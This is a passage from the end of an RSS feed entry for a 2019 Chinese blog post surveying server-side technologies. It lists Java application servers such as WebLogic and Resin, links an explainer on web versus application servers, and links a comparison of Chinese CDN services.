&lt;li&gt;&lt;a href=&quot;https://www.adobe.com/support/jrun/updates/3/updates_31.html&quot;&gt;&lt;u&gt;JRun&lt;/u&gt;&lt;/a&gt; 它是Micromedia的一个应用服务器&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;BEA
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.oracle.com/middleware/technologies/weblogic.html&quot;&gt;&lt;u&gt;WebLogic&lt;/u&gt;&lt;/a&gt; 一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Caucho Technology
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://caucho.com/&quot;&gt;&lt;u&gt;Resin&lt;/u&gt;&lt;/a&gt; 一个非常流行的支持servlets和jsp的引擎,速度非常快&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;搞不清Web服务器和应用服务器区别的看这里：&lt;a href=&quot;https://www.cnblogs.com/zx3707/p/5663010.html&quot;&gt;&lt;u&gt;浅谈Web服务器和应用服务器的区别&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;cdn网络加速服务&quot;&gt;11. CDN网络加速服务&lt;/h2&gt;
&lt;p&gt;附：&lt;a href=&quot;https://lanyueer.com/cdn-network-acceleration-service-comprehensive-comparison/&quot;&gt;&lt;u&gt;腾讯云、百度云、阿里云CDN网络加速服务综合对比&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 24 Feb 2019 14:36:00 +0000</pubDate>
<dc:creator>DASK</dc:creator>
<og:description>注：以下是一些服务器开发时常见框架的汇总，其中的排名是根据本人熟悉程度排序，不代表任何官方排名，详细性能比较请参考所提供的博客通道。 1. 负载均衡服务器 硬件类 F5 BIG IP 负载均衡器 基于</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/dask/p/10428467.html</dc:identifier>
</item>
</channel>
</rss>